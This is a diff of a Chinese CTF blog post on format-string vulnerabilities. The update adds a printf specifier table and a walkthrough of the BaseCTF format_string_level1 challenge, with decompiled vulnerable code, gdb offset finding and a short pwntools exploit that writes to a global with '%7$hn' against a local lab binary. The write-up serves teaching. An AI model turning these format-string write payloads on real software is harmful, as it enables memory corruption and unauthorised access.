@@ -23,11 +23,14 @@
 <meta property="og:image" content="https://blog.zyp0422.mom/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/5.png">
 <meta property="og:image" content="https://blog.zyp0422.mom/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/6.png">
 <meta property="og:image" content="https://blog.zyp0422.mom/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/7.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/11.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/12.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/13.png">
 <meta property="og:image" content="https://blog.zyp0422.mom/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/9.png">
 <meta property="og:image" content="https://blog.zyp0422.mom/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/10.png">
 <meta property="og:image" content="https://blog.zyp0422.mom/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/8.png">
 <meta property="article:published_time" content="2024-09-04T14:43:35.000Z">
-<meta property="article:modified_time" content="2024-09-04T15:20:29.290Z">
+<meta property="article:modified_time" content="2024-09-05T12:12:37.360Z">
 <meta property="article:author" content="zhoupeng">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
@@ -111,7 +114,7 @@
 			</ul>
 		</nav>
                                 <nav>
-    			总文章数 32
+    			总文章数 33
 		</nav>
 		<nav class="header-smart-menu">
 			
@@ -374,7 +377,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">1.6k字</span>
+      <span class="post-count">2k字</span>
     </span>
   </span>
 
@@ -383,7 +386,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">6分</span>
+      <span class="post-count">8分</span>
     </span>
   </span>
 </div>
@@ -422,6 +425,10 @@
 <p><strong>参见的格式化字符串</strong></p>
 <p>输入：scanf</p>
 <p>输出：printf、fprintf、vprintf、vfprintf、sprintf、snprintf、vsprintf、vsnprintf、setproctitie、syslog等</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%<span class="selector-tag">x</span> 以十六进制打印，只读打印<span class="number">4</span>字节，一般用于<span class="number">32</span>位</span><br><span class="line">%<span class="selector-tag">p</span> 打印目标地址，建议<span class="number">32</span>位和<span class="number">64</span>位都用这个</span><br><span class="line">%<span class="selector-tag">s</span> 打印地址内容</span><br><span class="line">%<span class="selector-tag">c</span> 打印单个字节</span><br><span class="line">%<span class="selector-tag">hhn</span> 打印一字节</span><br><span class="line">%<span class="selector-tag">hn</span> 打印两字节</span><br><span class="line">%<span class="selector-tag">n</span> 写四字节</span><br><span class="line">%<span class="selector-tag">ln</span> <span class="number">32</span>位写四字节，<span class="number">64</span>位写八字节</span><br><span class="line">%<span class="selector-tag">lln</span> 写八字节</span><br></pre></td></tr></table></figure>
+
+
+
 <h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="两种利用方式"><a href="#两种利用方式" class="headerlink" title="两种利用方式"></a>两种利用方式</h4><ul>
 <li>使程序崩溃，因为%s对应的参数地址不合法的概率比较大</li>
 <li>查看进程内容，根据%d、%f输出栈上内容</li>
@@ -458,7 +465,28 @@
 <p><img src="/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/7.png"></p>
 <p>注：利用%order$x来获取指定参数的值，利用%order$s来获取指定参数对应地址的内容</p>
 <h4 id="泄露任意内存地址"><a href="#泄露任意内存地址" class="headerlink" title="泄露任意内存地址"></a>泄露任意内存地址</h4><p>由于这里无法复现程序，所以详细见<a target="_blank" rel="noopener" href="https://ciphersaw.me/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit/">CTFwiki</a></p>
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="BaseCTF–-Week2-format-string-level0"><a href="#BaseCTF–-Week2-format-string-level0" class="headerlink" title="BaseCTF–[Week2] format_string_level0"></a>BaseCTF–[Week2] format_string_level0</h4><p>格式化字符串读取flag</p>
+<h4 id="改写数据"><a href="#改写数据" class="headerlink" title="改写数据"></a>改写数据</h4><p>例子–BaseCTF[Week2] format_string_level1</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 <span class="selector-tag">checksec</span> <span class="selector-tag">vuln</span></span><br><span class="line"><span class="selector-attr">[*]</span> &#x27;/<span class="selector-tag">root</span>/桌面/<span class="selector-tag">vuln</span>&#x27;</span><br><span class="line">    <span class="selector-tag">Arch</span>:     <span class="selector-tag">amd64-64-little</span></span><br><span class="line">    <span class="selector-tag">RELRO</span>:    <span class="selector-tag">Partial</span> <span class="selector-tag">RELRO</span></span><br><span class="line">    <span class="selector-tag">Stack</span>:    <span class="selector-tag">Canary</span> <span class="selector-tag">found</span></span><br><span class="line">    <span class="selector-tag">NX</span>:       <span class="selector-tag">NX</span> <span class="selector-tag">enabled</span></span><br><span class="line">    <span class="selector-tag">PIE</span>:      <span class="selector-tag">No</span> <span class="selector-tag">PIE</span> (<span class="number">0</span>x400000)</span><br></pre></td></tr></table></figure>
+
+<p>可以看出开启了canary（栈保护）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( target )</span><br><span class="line">    readflag();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">readflag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    fd = open(<span class="string">&quot;flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fd &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = read(fd, ptr, <span class="number">0x100</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_BYTE *)ptr + v2 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)ptr);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        perror(<span class="string">&quot;read failed&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;malloc failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出readflag函数，可以直接打印出flag文件的内容，但是要满足target不为0</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">read</span>(<span class="number">0</span>, buf, <span class="number">0</span>x100uLL);</span><br><span class="line"><span class="selector-tag">printf</span>(buf);</span><br></pre></td></tr></table></figure>
+
+<p>这两处代码存在格式化字符串漏洞</p>
+<p>接着我们通过gdb动态调试来说明一下</p>
+<p><img src="/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/11.png"></p>
+<p>运行到read函数我们输入八个字节，接着运行到printf函数</p>
+<p><img src="/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/12.png"></p>
+<p>可以看到我们输入的数据对应的offest是第7个，接着我们把下一个内容填充为target这时候我们就可以改写target中的值了</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">pwndbg</span>&gt; <span class="selector-tag">fmtarg</span> <span class="number">0</span><span class="selector-tag">x7fffffffdf50</span></span><br><span class="line"><span class="selector-tag">The</span> <span class="selector-tag">index</span> <span class="selector-tag">of</span> <span class="selector-tag">format</span> <span class="selector-tag">argument</span> : <span class="number">6</span> (\<span class="string">&quot;\%5$p\&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x4040b0</span></span><br><span class="line">payload = <span class="string">b&#x27;aaa%7$hn&#x27;</span> + p64(target)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/13.png"></p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="BaseCTF–-Week2-format-string-level0"><a href="#BaseCTF–-Week2-format-string-level0" class="headerlink" title="BaseCTF–[Week2] format_string_level0"></a>BaseCTF–[Week2] format_string_level0</h4><p>格式化字符串读取flag</p>
 <p>通过gdb调试可以获取答应出来flag对应的%n$s位置</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 使用<span class="selector-tag">gdb</span>调试文件</span><br><span class="line"><span class="selector-tag">gdb</span> ./<span class="selector-tag">vuln</span></span><br><span class="line"></span><br><span class="line"># 断点在<span class="selector-tag">main</span>函数，然后单步运行到输入<span class="selector-tag">aaaa</span></span><br><span class="line"><span class="selector-tag">b</span> <span class="selector-tag">main</span></span><br><span class="line"><span class="selector-tag">r</span></span><br><span class="line"><span class="selector-tag">ni</span></span><br><span class="line">.......</span><br><span class="line"><span class="selector-tag">aaaa</span></span><br></pre></td></tr></table></figure>
 
@@ -652,7 +680,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%9B%A0"><span class="toc-number">1.</span> <span class="toc-text">成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">基本原理介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">格式化字符串函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.1.</span> <span class="toc-text">两种利用方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%B4%A9%E6%BA%83"><span class="toc-number">3.2.</span> <span class="toc-text">程序崩溃</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98"><span class="toc-number">3.3.</span> <span class="toc-text">泄露内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80"><span class="toc-number">3.4.</span> <span class="toc-text">泄露内存地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80"><span class="toc-number">3.5.</span> <span class="toc-text">泄露任意内存地址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">4.</span> <span class="toc-text">例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BaseCTF%E2%80%93-Week2-format-string-level0"><span class="toc-number">4.1.</span> <span class="toc-text">BaseCTF–[Week2] format_string_level0</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%9B%A0"><span class="toc-number">1.</span> <span class="toc-text">成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">基本原理介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">格式化字符串函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.1.</span> <span class="toc-text">两种利用方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%B4%A9%E6%BA%83"><span class="toc-number">3.2.</span> <span class="toc-text">程序崩溃</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98"><span class="toc-number">3.3.</span> <span class="toc-text">泄露内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80"><span class="toc-number">3.4.</span> <span class="toc-text">泄露内存地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80"><span class="toc-number">3.5.</span> <span class="toc-text">泄露任意内存地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B9%E5%86%99%E6%95%B0%E6%8D%AE"><span class="toc-number">3.6.</span> <span class="toc-text">改写数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BaseCTF%E2%80%93-Week2-format-string-level0"><span class="toc-number">4.1.</span> <span class="toc-text">BaseCTF–[Week2] format_string_level0</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -829,18 +857,6 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">伪协议</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">反序列化</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">SSTI</a>
               </li>
              
@@ -850,6 +866,18 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">pwn</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">伪协议</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">反序列化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -865,11 +893,15 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">--红日靶场</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
               </li>
             
             <div class="clearfix"></div>
